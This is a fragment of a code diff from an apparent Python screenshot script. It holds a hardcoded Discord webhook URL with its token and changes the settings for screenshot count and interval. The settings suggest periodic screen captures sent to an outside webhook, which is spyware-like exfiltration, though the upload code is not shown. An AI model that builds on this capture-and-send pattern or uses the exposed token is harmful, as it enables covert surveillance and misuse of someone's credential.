@@ -6,8 +6,8 @@ import requests
 discord_webhook = "https://discord.com/api/webhooks/1356971307547361501/IGX0ZvQYPn7RFgYd6d7wpoL9xzCSL3EZ_VBjEzfimSs7eDidDMKHv12ncQmdgjOmWXVU"
 
 # Settings
-SCREENSHOTS = 10
-TIMING = 5
+SCREENSHOTS = 1
+TIMING = 10
 
 for i in range(SCREENSHOTS):
     sleep(TIMING)
